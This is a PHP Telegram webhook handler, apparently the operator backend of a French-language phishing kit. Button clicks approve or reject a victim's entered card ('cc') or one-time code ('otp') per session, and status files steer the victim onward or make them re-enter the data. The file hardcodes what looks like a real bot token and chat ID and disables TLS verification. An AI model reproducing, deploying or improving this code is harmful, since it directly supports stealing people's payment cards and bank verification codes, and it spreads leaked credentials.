<?php
/**
 * Telegram Webhook Callback Handler
 *
 * SETUP WEBHOOK:
 * https://api.telegram.org/bot<YOUR_TOKEN>/setWebhook?url=https://yourdomain.com/admin/callback.php
 *
 * CHECK WEBHOOK:
 * https://api.telegram.org/bot<YOUR_TOKEN>/getWebhookInfo
 */

// IMPORTANT: Désactiver l'affichage des erreurs pour éviter de casser la réponse
ini_set('display_errors', 0);
error_reporting(0);

// Charger la config avec gestion d'erreur
$configFile = __DIR__ . '/config.php';
if (!file_exists($configFile)) {
    $configFile = dirname(__DIR__) . '/config.php';
}

if (file_exists($configFile)) {
    require $configFile;
} else {
    // Fallback - mettre vos infos directement ici
    $token = '7328130141:AAGPZS-pBXqfdWigygH-_IP5Z77f5t4nJqY';
    $chat_id = '-1002255215041';
}

$statusDir = dirname(__DIR__) . '/status';
$logsDir = dirname(__DIR__) . '/logs';

if (!is_dir($statusDir)) @mkdir($statusDir, 0755, true);
if (!is_dir($logsDir)) @mkdir($logsDir, 0755, true);

// Log incoming requests for debugging
$content = file_get_contents("php://input");
@file_put_contents("$logsDir/telegram_webhook.log", 
    date('Y-m-d H:i:s') . " | RAW: " . $content . "\n", 
    FILE_APPEND);

$update = json_decode($content, true);

// Log parsed update
@file_put_contents("$logsDir/telegram_webhook.log", 
    date('Y-m-d H:i:s') . " | PARSED: " . print_r($update, true) . "\n", 
    FILE_APPEND);

// Handle callback queries (inline button clicks)
if (isset($update['callback_query'])) {
    $callbackQuery = $update['callback_query'];
    $callbackData = $callbackQuery['data'];
    $callbackId = $callbackQuery['id'];
    $messageId = $callbackQuery['message']['message_id'];
    $chatId = $callbackQuery['message']['chat']['id'];
    $originalText = $callbackQuery['message']['text'] ?? '';

    @file_put_contents("$logsDir/telegram_webhook.log", 
        date('Y-m-d H:i:s') . " | CALLBACK DATA: $callbackData\n", 
        FILE_APPEND);

    // Parse callback data: action_sessionId_type
    $parts = explode('_', $callbackData);

    if (count($parts) >= 3) {
        $action = $parts[0];      // approve or reject
        $sessionId = $parts[1];   // session ID
        $type = $parts[2];        // cc or otp

        $statusFile = "$statusDir/$sessionId.txt";

        @file_put_contents("$logsDir/telegram_webhook.log", 
            date('Y-m-d H:i:s') . " | Processing: action=$action, session=$sessionId, type=$type, file=$statusFile\n", 
            FILE_APPEND);

        // Determine new status and messages
        if ($action === 'approve') {
            $newStatus = "approved_{$type}";
            $emoji = '✅';
            $statusText = $type === 'cc' ? 'CARTE APPROUVÉE → SMS' : 'OTP APPROUVÉ → SUCCÈS';
            $alertText = $type === 'cc' ? '✅ Carte approuvée! Envoi vers OTP...' : '✅ OTP approuvé! Paiement validé!';
        } else {
            $newStatus = "rejected_{$type}";
            $emoji = '❌';
            $statusText = $type === 'cc' ? 'CARTE REFUSÉE' : 'OTP REFUSÉ → REDEMANDER';
            $alertText = $type === 'cc' ? '❌ Carte refusée!' : '❌ OTP refusé! Redemander...';
        }

        // Write status to file
        $result = @file_put_contents($statusFile, $newStatus);

        @file_put_contents("$logsDir/telegram_webhook.log", 
            date('Y-m-d H:i:s') . " | File write result: " . ($result !== false ? "SUCCESS ($result bytes)" : "FAILED") . "\n", 
            FILE_APPEND);

        // Log action
        $logData = date('Y-m-d H:i:s') . " | Action: $action | Type: $type | Session: $sessionId | Status: $newStatus | Write: " . ($result !== false ? 'OK' : 'FAIL') . "\n";
        @file_put_contents("$logsDir/actions.log", $logData, FILE_APPEND);

        // Answer callback query (show popup)
        answerCallbackQuery($callbackId, $alertText, $token);

        // Edit original message - GARDER LES INFOS + ajouter statut
        $newText = "$emoji <b>$statusText</b>\n";
        $newText .= "⏰ " . date('d/m/Y H:i:s') . "\n";
        $newText .= "━━━━━━━━━━━━━━━━━━━━━\n\n";
        $newText .= $originalText; // Garder le message original avec les infos

        editMessage($chatId, $messageId, $newText, true, $token); // true = supprimer les boutons
        
        @file_put_contents("$logsDir/telegram_webhook.log", 
            date('Y-m-d H:i:s') . " | Message edited successfully\n", 
            FILE_APPEND);
    } else {
        @file_put_contents("$logsDir/telegram_webhook.log", 
            date('Y-m-d H:i:s') . " | ERROR: Invalid callback data format. Parts: " . print_r($parts, true) . "\n", 
            FILE_APPEND);
    }
}

function answerCallbackQuery($callbackId, $text, $token) {
    $url = "https://api.telegram.org/bot$token/answerCallbackQuery";
    $data = [
        'callback_query_id' => $callbackId,
        'text' => $text,
        'show_alert' => true
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);

    global $logsDir;
    @file_put_contents("$logsDir/telegram_webhook.log", 
        date('Y-m-d H:i:s') . " | answerCallbackQuery response: $response\n", 
        FILE_APPEND);

    return $response;
}

function editMessage($chatId, $messageId, $newText, $removeButtons, $token) {
    $url = "https://api.telegram.org/bot$token/editMessageText";
    $data = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $newText,
        'parse_mode' => 'HTML'
    ];

    // Supprimer les boutons inline
    if ($removeButtons) {
        $data['reply_markup'] = json_encode(['inline_keyboard' => []]);
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);

    global $logsDir;
    @file_put_contents("$logsDir/telegram_webhook.log", 
        date('Y-m-d H:i:s') . " | editMessage response: $response\n", 
        FILE_APPEND);

    return $response;
}

// TOUJOURS retourner 200 OK à Telegram (CRUCIAL!)
http_response_code(200);
echo "OK";
exit;